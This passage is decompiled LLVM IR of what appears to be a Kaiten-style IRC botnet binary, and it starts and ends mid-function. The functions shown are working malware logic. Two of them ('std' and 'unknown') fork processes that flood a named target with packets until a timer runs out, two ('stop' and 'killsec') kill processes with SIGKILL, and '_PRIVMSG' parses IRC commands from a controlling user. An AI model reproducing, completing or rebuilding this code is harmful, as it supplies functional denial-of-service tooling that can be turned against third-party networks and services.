  uselistorder i8* %v1_8d14, { 1, 0, 2 }
  uselistorder i8* %v1_8ca0, { 1, 0, 2 }
  uselistorder i32 %storemerge26, { 1, 0 }
  uselistorder i32* %v1_8bf8, { 2, 0, 1 }
  uselistorder i32 %v1_8b50, { 1, 0 }
  uselistorder i32 %v2_8ae4, { 1, 0 }
  uselistorder i32 %v5_8abc, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v2_8a84, { 1, 0 }
  uselistorder i32 %v4_8a6c, { 1, 0 }
  uselistorder i32 %v3_8a0c, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v13_89f4, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 -1084, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8dac, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8d6c, { 1, 0 }
  uselistorder label %dec_label_pc_8cf8, { 1, 0 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8bd8, { 1, 0 }
  uselistorder label %dec_label_pc_8af8, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36300, i32* %stack_var_-4, align 4
  %v2_8dc8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8dc8, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-72, align 4
  %v8_8de8 = icmp sgt i32 %arg3, 2
  br i1 %v8_8de8, label %dec_label_pc_8df4, label %dec_label_pc_8dec

dec_label_pc_8dec:                                ; preds = %entry
  %v1_8df0 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8df4

dec_label_pc_8df4:                                ; preds = %entry, %dec_label_pc_8dec
  %v3_8e00 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_8e10 = call i32 @__GI_time(i32* null)
  %v3_8e1c = load i32, i32* %stack_var_-72, align 4
  %v1_8e20 = add i32 %v3_8e1c, 12
  %v1_8e24 = inttoptr i32 %v1_8e20 to i32*
  %v2_8e24 = load i32, i32* %v1_8e24, align 4
  store i32 %v2_8e24, i32* @r0, align 4
  %v1_8e2c = call i32 @atol(i32 %v2_8e24)
  %v1_8e3c = call i32 @mfork(i32 %arg2)
  %v2_8e44 = icmp eq i32 %v1_8e3c, 0
  br i1 %v2_8e44, label %dec_label_pc_8e4c, label %dec_label_pc_8f64

dec_label_pc_8e4c:                                ; preds = %dec_label_pc_8df4
  %v3_8e4c = load i32, i32* %stack_var_-72, align 4
  %v1_8e50 = add i32 %v3_8e4c, 4
  %v1_8e54 = inttoptr i32 %v1_8e50 to i32*
  %v2_8e54 = load i32, i32* %v1_8e54, align 4
  store i32 %v2_8e54, i32* @r0, align 4
  %v1_8e5c = call i32 @__GI_gethostbyname(i32 %v2_8e54)
  %v2_8e68 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8e68, i32* @r0, align 4
  %v2_8e74 = call i32 @bzero(i32 %v2_8e68, i32 16)
  %v1_8e7c = add i32 %v1_8e5c, 16
  %v2_8e7c = inttoptr i32 %v1_8e7c to i32*
  %v3_8e7c = load i32, i32* %v2_8e7c, align 4
  %v1_8e80 = inttoptr i32 %v3_8e7c to i32*
  %v2_8e80 = load i32, i32* %v1_8e80, align 4
  %v1_8e88 = add i32 %v1_8e5c, 12
  %v2_8e88 = inttoptr i32 %v1_8e88 to i32*
  %v3_8e88 = load i32, i32* %v2_8e88, align 4
  store i32 %v3_8e88, i32* @r2, align 4
  %v2_8e94 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8e94, i32* @r3, align 4
  %v3_8ea0 = call i32 @bcopy(i32 %v2_8e80, i32 %v2_8e94, i32 %v3_8e88)
  %v1_8ea8 = add i32 %v1_8e5c, 8
  %v2_8ea8 = inttoptr i32 %v1_8ea8 to i32*
  %v3_8ea8 = load i32, i32* %v2_8ea8, align 4
  %v3_8eb0 = urem i32 %v3_8ea8, 65536
  store i32 %v3_8eb0, i32* %stack_var_-52, align 4
  %v3_8eb8 = load i32, i32* %stack_var_-72, align 4
  %v1_8ebc = add i32 %v3_8eb8, 8
  %v1_8ec0 = inttoptr i32 %v1_8ebc to i32*
  %v2_8ec0 = load i32, i32* %v1_8ec0, align 4
  store i32 %v2_8ec0, i32* @r0, align 4
  %v1_8ec8 = call i32 @atol(i32 %v2_8ec0)
  %v2_8f30 = add i32 %v1_8e2c, %v2_8e10
  br label %dec_label_pc_8ee4

dec_label_pc_8ee4:                                ; preds = %dec_label_pc_8f54, %dec_label_pc_8e4c
  %storemerge1 = phi i32 [ 0, %dec_label_pc_8e4c ], [ %v1_8f58, %dec_label_pc_8f54 ]
  %tmp = icmp ult i32 %storemerge1, 50
  br i1 %tmp, label %dec_label_pc_8f54, label %dec_label_pc_8ef0

dec_label_pc_8ef0:                                ; preds = %dec_label_pc_8ee4
  %v5_8f00 = call i32 @__libc_send(i32 %v3_8e00, i32 ptrtoint ([4 x i8]* @global_var_1a32c.302 to i32), i32 50, i32 0)
  %v3_8f14 = call i32 @__libc_connect(i32 %v3_8e00, i32 %v2_8e68, i32 16)
  %v2_8f1c = call i32 @__GI_time(i32* null)
  store i32 %v2_8f1c, i32* @r1, align 4
  %v3_8f34 = icmp ult i32 %v2_8f1c, %v2_8f30
  br i1 %v3_8f34, label %dec_label_pc_8f4c, label %dec_label_pc_8f3c

dec_label_pc_8f3c:                                ; preds = %dec_label_pc_8ef0
  %v1_8f40 = call i32 @__GI___libc_close(i32 %v3_8e00)
  %v1_8f48 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8ef0, %dec_label_pc_8f3c
  br label %dec_label_pc_8f54

dec_label_pc_8f54:                                ; preds = %dec_label_pc_8ee4, %dec_label_pc_8f4c
  %stack_var_-20.0 = phi i32 [ %storemerge1, %dec_label_pc_8ee4 ], [ 0, %dec_label_pc_8f4c ]
  %v1_8f58 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_8ee4

dec_label_pc_8f64:                                ; preds = %dec_label_pc_8df4
  ret i32 %v1_8e3c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v2_8e68, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8f54, { 1, 0 }
  uselistorder label %dec_label_pc_8f4c, { 1, 0 }
  uselistorder label %dec_label_pc_8df4, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36736, i32* %stack_var_-4, align 4
  %v2_8f7c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8f7c, i32* @fp, align 4
  %v0_8f84 = load i32, i32* %r0.global-to-local, align 4
  %v2_8ff4 = icmp eq i32 %arg2, 0
  %v2_906814 = load i32, i32* @global_var_24748.287, align 4
  %v3_907016 = icmp eq i32 %v2_906814, 0
  br i1 %v3_907016, label %dec_label_pc_9078, label %dec_label_pc_8fa0

dec_label_pc_8fa0:                                ; preds = %dec_label_pc_9058, %entry
  %storemerge122 = phi i32 [ %v1_905c, %dec_label_pc_9058 ], [ 0, %entry ]
  %v1_908021 = phi i32 [ %v1_90802, %dec_label_pc_9058 ], [ %v0_8f84, %entry ]
  %v3_8fa4 = mul i32 %storemerge122, 4
  %v2_8fb0 = load i32, i32* @global_var_27864.289, align 4
  %v2_8fb4 = add i32 %v2_8fb0, %v3_8fa4
  %v1_8fb8 = inttoptr i32 %v2_8fb4 to i32*
  %v2_8fb8 = load i32, i32* %v1_8fb8, align 4
  %v2_8fbc = icmp eq i32 %v2_8fb8, 0
  br i1 %v2_8fbc, label %dec_label_pc_9058, label %dec_label_pc_8fc4

dec_label_pc_8fc4:                                ; preds = %dec_label_pc_8fa0
  %v2_8fdc = load i32, i32* %v1_8fb8, align 4
  store i32 %v2_8fdc, i32* @r4, align 4
  %v0_8fe0 = call i32 @__getpid()
  store i32 %v0_8fe0, i32* %r0.global-to-local, align 4
  %v0_8fe8 = load i32, i32* @r4, align 4
  %v9_8fe8 = icmp eq i32 %v0_8fe8, %v0_8fe0
  br i1 %v9_8fe8, label %dec_label_pc_9058, label %dec_label_pc_8ff0

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fc4
  br i1 %v2_8ff4, label %dec_label_pc_9030, label %dec_label_pc_8ffc

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8ff0
  %v2_9000 = load i32, i32* @global_var_27860.305, align 4
  store i32 %v0_8f84, i32* %r0.global-to-local, align 4
  %v4_902c = call i32 @Send(i32 %v0_8f84, i32 ptrtoint ([29 x i8]* @global_var_1a330.307 to i32), i32 %v2_9000)
  store i32 %v4_902c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9030

dec_label_pc_9030:                                ; preds = %dec_label_pc_8ff0, %dec_label_pc_8ffc
  %v2_9040 = load i32, i32* @global_var_27864.289, align 4
  %v2_9044 = add i32 %v2_9040, %v3_8fa4
  %v1_9048 = inttoptr i32 %v2_9044 to i32*
  %v2_9048 = load i32, i32* %v1_9048, align 4
  store i32 %v2_9048, i32* %r0.global-to-local, align 4
  %v2_9054 = call i32 @kill(i32 %v2_9048, i32 9)
  store i32 %v2_9054, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9058

dec_label_pc_9058:                                ; preds = %dec_label_pc_8fc4, %dec_label_pc_8fa0, %dec_label_pc_9030
  %v1_90802 = phi i32 [ %v0_8fe0, %dec_label_pc_8fc4 ], [ %v1_908021, %dec_label_pc_8fa0 ], [ %v2_9054, %dec_label_pc_9030 ]
  %v1_905c = add i32 %storemerge122, 1
  %v2_9068 = load i32, i32* @global_var_24748.287, align 4
  %v3_9070 = icmp ult i32 %v1_905c, %v2_9068
  br i1 %v3_9070, label %dec_label_pc_8fa0, label %dec_label_pc_9078

dec_label_pc_9078:                                ; preds = %dec_label_pc_9058, %entry
  %v1_9080.lcssa = phi i32 [ %v0_8f84, %entry ], [ %v1_90802, %dec_label_pc_9058 ]
  ret i32 %v1_9080.lcssa

; uselistorder directives
  uselistorder i32 %v1_905c, { 1, 0 }
  uselistorder i32 %v3_8fa4, { 1, 0 }
  uselistorder i32 %storemerge122, { 1, 0 }
  uselistorder i32 %v0_8f84, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 5, 4, 6, 0, 1 }
  uselistorder label %dec_label_pc_9058, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9030, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 37024, i32* %stack_var_-4, align 4
  %v2_909c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_909c, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_90c0 = call i32 @malloc(i32 9216)
  %v2_90d0 = call i32 @__GI_time(i32* null)
  %v1_90e0 = call i32 @mfork(i32 %arg2)
  %v2_90e8 = icmp eq i32 %v1_90e0, 0
  br i1 %v2_90e8, label %dec_label_pc_90f0, label %dec_label_pc_9258

dec_label_pc_90f0:                                ; preds = %entry
  %v7_90f4 = icmp eq i32 %arg3, 2
  br i1 %v7_90f4, label %dec_label_pc_9104, label %dec_label_pc_90fc

dec_label_pc_90fc:                                ; preds = %dec_label_pc_90f0
  %v1_9100 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_9104

dec_label_pc_9104:                                ; preds = %dec_label_pc_90f0, %dec_label_pc_90fc
  %v1_9108 = add i32 %arg4, 8
  %v1_910c = inttoptr i32 %v1_9108 to i32*
  %v2_910c = load i32, i32* %v1_910c, align 4
  store i32 %v2_910c, i32* @r0, align 4
  %v1_9114 = call i32 @atol(i32 %v2_910c)
  %v2_9120 = ptrtoint i32* %stack_var_-60 to i32
  %v3_9130 = bitcast i32* %stack_var_-60 to i8*
  %v4_9130 = call i32 @__GI_memset(i8* %v3_9130, i32 0, i32 16)
  %v1_9138 = add i32 %arg4, 4
  %v1_913c = inttoptr i32 %v1_9138 to i32*
  %v2_913c = load i32, i32* %v1_913c, align 4
  %v2_9148 = call i32 @host2ip(i32 %arg2, i32 %v2_913c)
  store i32 2, i32* %stack_var_-60, align 4
  %v2_9160 = load i32, i32* @global_var_27860.305, align 4
  %v4_9178 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1a350.311 to i32), i32 %v2_9160)
  %v2_9224 = add i32 %v1_9114, %v2_90d0
  %v2_91bc = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_917c

dec_label_pc_917c:                                ; preds = %dec_label_pc_9238, %dec_label_pc_9104
  %stack_var_-36.0 = phi i32 [ %tmp, %dec_label_pc_9104 ], [ %v1_923c, %dec_label_pc_9238 ]
  %v0_917c = call i32 @rand()
  %v3_919c = call i32 @socket(i32 2, i32 2, i32 17)
  %v1_91ac = icmp slt i32 %v3_919c, 0
  br i1 %v1_91ac, label %dec_label_pc_9200, label %dec_label_pc_91b4

dec_label_pc_91b4:                                ; preds = %dec_label_pc_917c
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %v2_91bc, i32* @r3, align 4
  %v3_91d0 = call i32 @ioctl(i32 %v3_919c, i32 21537, i32 %v2_91bc)
  %v6_91f4 = call i32 @__libc_sendto(i32 %v3_919c, i32 %v1_90c0, i32 9216, i32 0, i32 %v2_9120, i32 16)
  %v1_91fc = call i32 @__GI___libc_close(i32 %v3_919c)
  br label %dec_label_pc_9200

dec_label_pc_9200:                                ; preds = %dec_label_pc_917c, %dec_label_pc_91b4
  %v7_9208 = icmp slt i32 %stack_var_-36.0, 50
  br i1 %v7_9208, label %dec_label_pc_9238, label %dec_label_pc_920c

dec_label_pc_920c:                                ; preds = %dec_label_pc_9200
  %v2_9210 = call i32 @__GI_time(i32* null)
  store i32 %v2_9210, i32* @r1, align 4
  %v3_9228 = icmp ult i32 %v2_9210, %v2_9224
  br i1 %v3_9228, label %dec_label_pc_9230, label %dec_label_pc_9248

dec_label_pc_9230:                                ; preds = %dec_label_pc_920c
  br label %dec_label_pc_9238

dec_label_pc_9238:                                ; preds = %dec_label_pc_9200, %dec_label_pc_9230
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_9200 ], [ 0, %dec_label_pc_9230 ]
  %v1_923c = add i32 %stack_var_-36.1, 1
  br label %dec_label_pc_917c

dec_label_pc_9248:                                ; preds = %dec_label_pc_920c
  %v1_924c = call i32 @__GI___libc_close(i32 %v3_919c)
  %v1_9254 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9258

dec_label_pc_9258:                                ; preds = %entry, %dec_label_pc_9248
  %v1_9260 = phi i32 [ %v1_90e0, %entry ], [ %v1_9254, %dec_label_pc_9248 ]
  ret i32 %v1_9260

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 50, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @mfork, { 1, 0 }
  uselistorder label %dec_label_pc_9258, { 1, 0 }
  uselistorder label %dec_label_pc_9238, { 1, 0 }
  uselistorder label %dec_label_pc_9200, { 1, 0 }
  uselistorder label %dec_label_pc_9104, { 1, 0 }
}

define i32 @killsec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_9290 = load i32, i32* bitcast ([2 x i8*]* @global_var_244ac.315 to i32*), align 4
  %tmp10 = inttoptr i32 %v2_9290 to i8*
  %v4_929c = call i32 @__GI_strcasecmp(i8* %tmp10, i32 %arg2)
  %v2_92a4 = icmp eq i32 %v4_929c, 0
  br i1 %v2_92a4, label %dec_label_pc_92ac, label %dec_label_pc_92b8

dec_label_pc_92ac:                                ; preds = %entry
  %v2_92b4 = call i32 @kill(i32 0, i32 9)
  br label %dec_label_pc_92b8

dec_label_pc_92b8:                                ; preds = %entry, %dec_label_pc_92ac
  %v1_92c0 = phi i32 [ %v4_929c, %entry ], [ %v2_92b4, %dec_label_pc_92ac ]
  ret i32 %v1_92c0

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 1, 0 }
  uselistorder label %dec_label_pc_92b8, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp32 = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-1116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 37588, i32* %stack_var_-4, align 4
  %v2_92d0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_92d0, i32* @fp, align 4
  br label %dec_label_pc_9300

dec_label_pc_92f4:                                ; preds = %dec_label_pc_9318
  %v1_92f8 = add i32 %storemerge11, 1
  br label %dec_label_pc_9300

dec_label_pc_9300:                                ; preds = %entry, %dec_label_pc_92f4
  %storemerge11 = phi i32 [ 0, %entry ], [ %v1_92f8, %dec_label_pc_92f4 ]
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v3_9308 = call i32 @strlen(i8* %tmp)
  store i32 %v3_9308, i32* %r0.global-to-local, align 4
  %v3_9310 = icmp ult i32 %storemerge11, %v3_9308
  br i1 %v3_9310, label %dec_label_pc_9318, label %dec_label_pc_9300.dec_label_pc_9334_crit_edge

dec_label_pc_9300.dec_label_pc_9334_crit_edge:    ; preds = %dec_label_pc_9300
  %.pre = add i32 %storemerge11, %arg3
  %.pre24 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_9334

dec_label_pc_9318:                                ; preds = %dec_label_pc_9300
  %v2_9324 = add i32 %storemerge11, %arg3
  %v1_9328 = inttoptr i32 %v2_9324 to i8*
  %v2_9328 = load i8, i8* %v1_9328, align 1
  %v7_932c = icmp eq i8 %v2_9328, 32
  br i1 %v7_932c, label %dec_label_pc_9334, label %dec_label_pc_92f4

dec_label_pc_9334:                                ; preds = %dec_label_pc_9318, %dec_label_pc_9300.dec_label_pc_9334_crit_edge
  %v3_9348.pre-phi = phi i8* [ %.pre24, %dec_label_pc_9300.dec_label_pc_9334_crit_edge ], [ %v1_9328, %dec_label_pc_9318 ]
  %v2_9340.pre-phi = phi i32 [ %.pre, %dec_label_pc_9300.dec_label_pc_9334_crit_edge ], [ %v2_9324, %dec_label_pc_9318 ]
  store i8 0, i8* %v3_9348.pre-phi, align 1
  %v1_9364 = add i32 %v2_9340.pre-phi, 2
  %v5_9368 = inttoptr i32 %v1_9364 to i8*
  br label %dec_label_pc_9384

dec_label_pc_9378:                                ; preds = %dec_label_pc_939c
  %v1_937c = add i32 %storemerge12, 1
  br label %dec_label_pc_9384

dec_label_pc_9384:                                ; preds = %dec_label_pc_9334, %dec_label_pc_9378
  %storemerge12 = phi i32 [ 0, %dec_label_pc_9334 ], [ %v1_937c, %dec_label_pc_9378 ]
  store i32 %storemerge12, i32* @r4, align 4
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %v3_938c = call i32 @strlen(i8* %arg2)
  store i32 %v3_938c, i32* %r0.global-to-local, align 4
  %v0_9394 = load i32, i32* @r4, align 4
  %v3_9394 = icmp ult i32 %v0_9394, %v3_938c
  br i1 %v3_9394, label %dec_label_pc_939c, label %dec_label_pc_9384.dec_label_pc_93b8_crit_edge

dec_label_pc_9384.dec_label_pc_93b8_crit_edge:    ; preds = %dec_label_pc_9384
  %.pre25 = add i32 %storemerge12, %tmp32
  %.pre26 = inttoptr i32 %.pre25 to i8*
  br label %dec_label_pc_93b8

dec_label_pc_939c:                                ; preds = %dec_label_pc_9384
  %v2_93a8 = add i32 %storemerge12, %tmp32
  %v1_93ac = inttoptr i32 %v2_93a8 to i8*
  %v2_93ac = load i8, i8* %v1_93ac, align 1
  %v7_93b0 = icmp eq i8 %v2_93ac, 33
  br i1 %v7_93b0, label %dec_label_pc_93b8, label %dec_label_pc_9378

dec_label_pc_93b8:                                ; preds = %dec_label_pc_939c, %dec_label_pc_9384.dec_label_pc_93b8_crit_edge
  %v3_93cc.pre-phi = phi i8* [ %.pre26, %dec_label_pc_9384.dec_label_pc_93b8_crit_edge ], [ %v1_93ac, %dec_label_pc_939c ]
  store i8 0, i8* %v3_93cc.pre-phi, align 1
  %v2_93d4 = load i8, i8* %v5_9368, align 1
  %v7_93d8 = icmp eq i8 %v2_93d4, 33
  br i1 %v7_93d8, label %dec_label_pc_93e0, label %dec_label_pc_9820

dec_label_pc_93e0:                                ; preds = %dec_label_pc_93b8
  %v2_93e4 = load i32, i32* @global_var_27860.305, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v4_93f0 = call i32 @__GI_strcasecmp(i8* %tmp, i32 %v2_93e4)
  store i32 %v4_93f0, i32* %r0.global-to-local, align 4
  %v2_93f8 = icmp eq i32 %v4_93f0, 0
  br i1 %v2_93f8, label %dec_label_pc_9400, label %dec_label_pc_9820

dec_label_pc_9400:                                ; preds = %dec_label_pc_93e0
  %v2_9408 = ptrtoint i32* %stack_var_-1116 to i32
  store i32 %v2_9408, i32* %r0.global-to-local, align 4
  %v3_9418 = bitcast i32* %stack_var_-1116 to i8*
  %v4_9418 = call i32 @__GI_memset(i8* %v3_9418, i32 0, i32 1024)
  store i32 %v4_9418, i32* %r0.global-to-local, align 4
  %v1_9428 = add i32 %v2_9340.pre-phi, 3
  %v5_942c = inttoptr i32 %v1_9428 to i8*
  br label %dec_label_pc_9448

dec_label_pc_943c:                                ; preds = %dec_label_pc_9460
  %v1_9440 = add i32 %storemerge13, 1
  br label %dec_label_pc_9448

dec_label_pc_9448:                                ; preds = %dec_label_pc_9400, %dec_label_pc_943c
  %storemerge13 = phi i32 [ 0, %dec_label_pc_9400 ], [ %v1_9440, %dec_label_pc_943c ]
  store i32 %storemerge13, i32* @r4, align 4
  store i32 %v1_9428, i32* %r0.global-to-local, align 4
  %v3_9450 = call i32 @strlen(i8* %v5_942c)
  store i32 %v3_9450, i32* %r0.global-to-local, align 4
  %v0_9458 = load i32, i32* @r4, align 4
  %v3_9458 = icmp ult i32 %v0_9458, %v3_9450
  br i1 %v3_9458, label %dec_label_pc_9460, label %dec_label_pc_9448.dec_label_pc_947c_crit_edge

dec_label_pc_9448.dec_label_pc_947c_crit_edge:    ; preds = %dec_label_pc_9448
  %.pre27 = add i32 %storemerge13, %v1_9428
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_947c

dec_label_pc_9460:                                ; preds = %dec_label_pc_9448
  %v2_946c = add i32 %storemerge13, %v1_9428
  %v1_9470 = inttoptr i32 %v2_946c to i8*
  %v2_9470 = load i8, i8* %v1_9470, align 1
  %v7_9474 = icmp eq i8 %v2_9470, 32
  br i1 %v7_9474, label %dec_label_pc_947c, label %dec_label_pc_943c

dec_label_pc_947c:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9448.dec_label_pc_947c_crit_edge
  %v3_9490.pre-phi = phi i8* [ %.pre28, %dec_label_pc_9448.dec_label_pc_947c_crit_edge ], [ %v1_9470, %dec_label_pc_9460 ]
  store i8 0, i8* %v3_9490.pre-phi, align 1
  %v2_949c = load i32, i32* @global_var_27848.318, align 4
  store i32 %v1_9428, i32* %r0.global-to-local, align 4
  %v3_94a8 = call i32 @strwildmatch(i8* %v5_942c, i32 %v2_949c)
  store i32 %v3_94a8, i32* %r0.global-to-local, align 4
  %v2_94b0 = icmp eq i32 %v3_94a8, 0
  br i1 %v2_94b0, label %dec_label_pc_94b8, label %dec_label_pc_9820

dec_label_pc_94b8:                                ; preds = %dec_label_pc_947c
  %v1_94bc = add i32 %v2_9340.pre-phi, 4
  %v2_94c4 = add i32 %storemerge13, %v1_94bc
  %v5_94c8 = inttoptr i32 %v2_94c4 to i8*
  store i32 %v2_94c4, i32* %r0.global-to-local, align 4
  %v3_94d0 = call i32 @strlen(i8* %v5_94c8)
  store i32 %v3_94d0, i32* %r0.global-to-local, align 4
  %v2_951c = ptrtoint i32* %stack_var_-24 to i32
  %v2_9520 = add i32 %v2_951c, -1092
  br label %dec_label_pc_9548

dec_label_pc_94e8:                                ; preds = %dec_label_pc_9548
  %v2_94ec = load i8, i8* %stack_var_-36.0, align 1
  %v7_94f0 = icmp eq i8 %v2_94ec, 32
  br i1 %v7_94f0, label %dec_label_pc_9598, label %dec_label_pc_94f8

dec_label_pc_94f8:                                ; preds = %dec_label_pc_94e8
  %v2_94fc = load i8, i8* %stack_var_-36.0, align 1
  %v2_9500 = icmp eq i8 %v2_94fc, 0
  br i1 %v2_9500, label %dec_label_pc_9598, label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94f8
  %v2_9510 = load i8, i8* %stack_var_-36.0, align 1
  store i32 %v2_951c, i32* %r0.global-to-local, align 4
  %v2_9524 = add i32 %v2_9520, %storemerge14
  %v3_952c = inttoptr i32 %v2_9524 to i8*
  store i8 %v2_9510, i8* %v3_952c, align 1
  %v1_9534 = add i32 %v4_94e8, 1
  %v5_9538 = inttoptr i32 %v1_9534 to i8*
  %v1_9540 = add nuw i32 %storemerge14, 1
  br label %dec_label_pc_9548

dec_label_pc_9548:                                ; preds = %dec_label_pc_94b8, %dec_label_pc_9508
  %stack_var_-36.0 = phi i8* [ %v5_94c8, %dec_label_pc_94b8 ], [ %v5_9538, %dec_label_pc_9508 ]
  %storemerge14 = phi i32 [ 0, %dec_label_pc_94b8 ], [ %v1_9540, %dec_label_pc_9508 ]
  %v5_9554 = icmp slt i32 %storemerge14, %v3_94d0
  %v4_94e8 = ptrtoint i8* %stack_var_-36.0 to i32
  br i1 %v5_9554, label %dec_label_pc_94e8, label %dec_label_pc_9598

dec_label_pc_9564:                                ; preds = %dec_label_pc_9598
  %v2_9570 = add i32 %storemerge15, %v4_94e8
  %v1_9574 = inttoptr i32 %v2_9570 to i8*
  %v2_9574 = load i8, i8* %v1_9574, align 1
  %v7_9578 = icmp eq i8 %v2_9574, 32
  br i1 %v7_9578, label %dec_label_pc_9580, label %dec_label_pc_958c

dec_label_pc_9580:                                ; preds = %dec_label_pc_9564
  %v1_9584 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_958c

dec_label_pc_958c:                                ; preds = %dec_label_pc_9564, %dec_label_pc_9580
  %stack_var_-32.0 = phi i32 [ %v1_9584, %dec_label_pc_9580 ], [ %stack_var_-32.1, %dec_label_pc_9564 ]
  %v1_9590 = add i32 %storemerge15, 1
  br label %dec_label_pc_9598

dec_label_pc_9598:                                ; preds = %dec_label_pc_94e8, %dec_label_pc_94f8, %dec_label_pc_9548, %dec_label_pc_958c
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_958c ], [ 0, %dec_label_pc_9548 ], [ 0, %dec_label_pc_94f8 ], [ 0, %dec_label_pc_94e8 ]
  %storemerge15 = phi i32 [ %v1_9590, %dec_label_pc_958c ], [ 0, %dec_label_pc_9548 ], [ 0, %dec_label_pc_94f8 ], [ 0, %dec_label_pc_94e8 ]
  store i32 %storemerge15, i32* @r4, align 4
  store i32 %v4_94e8, i32* %r0.global-to-local, align 4
  %v3_95a0 = call i32 @strlen(i8* %stack_var_-36.0)
  store i32 %v3_95a0, i32* %r0.global-to-local, align 4
  %v0_95a8 = load i32, i32* @r4, align 4
  %v3_95a8 = icmp ult i32 %v0_95a8, %v3_95a0
  br i1 %v3_95a8, label %dec_label_pc_9564, label %dec_label_pc_95b0

dec_label_pc_95b0:                                ; preds = %dec_label_pc_9598
  %v1_95b4 = add i32 %stack_var_-32.1, 1
  %v7_95c4 = icmp slt i32 %v1_95b4, 11
  br i1 %v7_95c4, label %dec_label_pc_95d0, label %dec_label_pc_95c8

dec_label_pc_95c8:                                ; preds = %dec_label_pc_95b0
  br label %dec_label_pc_95d0

dec_label_pc_95d0:                                ; preds = %dec_label_pc_95b0, %dec_label_pc_95c8
  %stack_var_-32.2 = phi i32 [ %v1_95b4, %dec_label_pc_95b0 ], [ 10, %dec_label_pc_95c8 ]
  %tmp77 = mul i32 %stack_var_-32.2, 4
  %v3_95ec = add i32 %tmp77, 4
  %v2_95f4 = add i32 %v2_951c, -68
  %v2_95f8 = add i32 %v2_95f4, %v3_95ec
  %v2_9600 = inttoptr i32 %v2_95f8 to i32*
  store i32 ptrtoint (i32* @global_var_1a3b4.320 to i32), i32* %v2_9600, align 4
  %v2_972819 = load i8, i8* %stack_var_-36.0, align 1
  %v2_972c21 = icmp eq i8 %v2_972819, 0
  br i1 %v2_972c21, label %dec_label_pc_9734, label %dec_label_pc_9610

dec_label_pc_9610:                                ; preds = %dec_label_pc_95d0, %dec_label_pc_9678
